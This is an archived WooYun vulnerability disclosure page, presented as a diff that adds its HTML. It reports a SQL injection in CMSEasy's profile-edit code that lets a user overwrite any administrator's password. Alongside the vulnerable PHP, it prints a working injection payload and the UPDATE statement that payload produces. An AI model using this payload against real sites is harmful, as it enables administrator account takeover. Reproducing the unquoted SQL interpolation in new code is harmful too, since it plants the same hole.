@@ -1,0 +1,248 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		cmseasy修改任意管理员密码漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		cmseasy修改任意管理员密码漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-10-20 22:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-23：	细节向第三方安全合作伙伴开放<br/>
+									2013-10-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-09：	细节向普通白帽子公开<br/>
+									2013-11-29：	细节向实习白帽子公开<br/>
+									2014-01-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">其实我是来刷普通白帽子的...cmseasy对GET过滤的比较严,对于POST基本没有过滤,各种跨站各种包含。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">lib/default/user_act.php<br />
+<br />
+</p><pre><code>function edit_action() {<br />
+        if(front::post(&#039;submit&#039;)) {<br />
+        	unset(front::$post[&#039;groupid&#039;]);<br />
+        	unset(front::$post[&#039;powerlist&#039;]);<br />
+        	foreach (front::$post as $k =&gt; $v){<br />
+        		if(is_array($v) &amp;&amp; !empty($v)){<br />
+        			front::$post[$k] = implode(&#039;,&#039;, $v);<br />
+        		}<br />
+        		front::check_type(front::post($k), &#039;safe&#039;); //is_safe自定义函数对其无影响,跟进0x01<br />
+        	}<br />
+            $this-&gt;_user-&gt;rec_update(front::$post,&#039;userid=&#039;.session::get(&#039;userid&#039;)); //问题出在这儿，跟进0x02<br />
+            front::flash(lang(&#039;修改资料成功！&#039;));<br />
+            front::redirect(url::create(&#039;user/index&#039;));<br />
+        }<br />
+        $this-&gt;view-&gt;data=$this-&gt;view-&gt;user;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+lib/tool/front_class.php 0x01<br />
+<br />
+</p><pre><code>static function check_type($var,$type=&#039;number&#039;) {<br />
+        $func=&quot;is_$type&quot;;<br />
+        if (!$func($var)) {<br />
+            header(&quot;HTTP/1.0 404 Not Found&quot;);<br />
+            exit(&#039;PAGE NOT FOUND!&#039;);<br />
+        }<br />
+    }<br />
+function is_safe($string) {<br />
+	if(!$string) return true;<br />
+	if(false !== strpos($string,&#039;&lt;script&#039;)){<br />
+		return false;<br />
+	}<br />
+	if(false !== strpos($string,&#039;vbscript:&#039;)){<br />
+		return false;<br />
+	}<br />
+	if(false !== strpos($string,&#039;javascript:&#039;)){<br />
+		return false;<br />
+	}<br />
+    /*if ($string &lt;&gt;addslashes($string))<br />
+        return false;<br />
+    else*/<br />
+        return true;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+lib/inc/table.php 0x02<br />
+<br />
+</p><pre><code>function rec_update($row,$where) {<br />
+        $tbname=$this-&gt;name;<br />
+        $sql=$this-&gt;sql_update($tbname,$row,$where);<br />
+       //echo $sql.&quot;&lt;br&gt;&quot;;<br />
+        return $this-&gt;query_unbuffered($sql);<br />
+}<br />
+function sql_update($tbname,$row,$where) {<br />
+        $sqlud=&#039;&#039;;<br />
+        if (is_string($row))<br />
+            $sqlud=$row.&#039; &#039;;<br />
+        else<br />
+            foreach ($row as $key=&gt;$value) {<br />
+                if (in_array($key,explode(&#039;,&#039;,$this-&gt;getcolslist()))) {<br />
+                    $value=$value;<br />
+                    if (preg_match(&#039;/^\[(.*)\]$/&#039;,$value,$match))<br />
+                        $sqlud .= &quot;`$key`&quot;.&quot;= &quot;.$match[1].&quot;,&quot;; //没加引号。只要匹配上面的正则就行，中括号里面输入注入语句就行。<br />
+//[1,password=0x6531306164633339343962613539616262653536653035376632306638383365 where userid=1%23]<br />
+//UPDATE `cmseasy_user` SET `nickname`= 1,password=0x6531306164633339343962613539616262653536653035376632306638383365 where userid=1<br />
+                    elseif ($value === &quot;&quot;)<br />
+                        $sqlud .= &quot;`$key`= NULL, &quot;;<br />
+                    else<br />
+                        $sqlud .= &quot;`$key`&quot;.&quot;= &#039;&quot;.$value.&quot;&#039;,&quot;;<br />
+                }<br />
+            }<br />
+        $sqlud=rtrim($sqlud);<br />
+        $sqlud=rtrim($sqlud,&#039;,&#039;);<br />
+        $this-&gt;condition($where);<br />
+        $sql=&quot;UPDATE `&quot;.$tbname.&quot;` SET &quot;.$sqlud.&quot; WHERE &quot;.$where;<br />
+<br />
+        return $sql;<br />
+    }</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/20134112ec77b0479127db5a856a0bafe215182f.png" target="_blank"><img src="../images/20134112ec77b0479127db5a856a0bafe215182f.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/20134058c79ceca2327975d405d6893e13b31bc5.png" target="_blank"><img src="../images/20134058c79ceca2327975d405d6893e13b31bc5.png" alt="2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">求包养。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040410" title="cmseasy修改任意管理员密码漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-10-20 23:00</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">马上处理，感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40410";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
